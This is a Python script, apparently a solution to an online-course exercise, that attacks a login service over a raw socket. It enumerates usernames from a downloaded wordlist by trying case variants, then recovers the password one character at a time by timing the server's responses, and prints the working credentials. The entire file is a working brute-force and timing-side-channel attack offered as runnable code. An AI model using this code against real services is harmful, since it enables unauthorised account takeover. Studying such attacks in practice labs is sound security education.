import socket
import sys
import string
import requests
import json
import itertools
from datetime import datetime
from datetime import timedelta
from datetime import time


req = {'login': '', 'password': ' '}
ltt = string.ascii_letters + string.digits
pas = requests.get("https://stepik.org/media/attachments/lesson/255258/logins.txt")
pas_list = pas.text.split()


def next_pas(lst):
    for d in lst:
        for k in list(map("".join, itertools.product(*zip(d.upper(), d.lower())))):
            yield k


with socket.socket() as jopa_sock:
    jopa_sock.connect((sys.argv[1], int(sys.argv[2])))

    for pp in next_pas(pas_list):
        req['login'] = pp
        jopa_sock.send(json.dumps(req).encode())
        if json.loads(jopa_sock.recv(1024).decode())['result'] == "Wrong password!":
            req['password'] = ""
            break
    pop = True
    pip = ""
    while pop:
        for n in ltt:
            req['password'] = pip + n
            start = datetime.now()
            jopa_sock.send(json.dumps(req).encode())
            ans = json.loads(jopa_sock.recv(1024).decode())
            finish = datetime.now()
            difference = finish - start
            if difference.microseconds > 100000:
                pip += n
                break
            if ans['result'] == "Connection success!":
                print(json.dumps(req))
                pop = False
                break


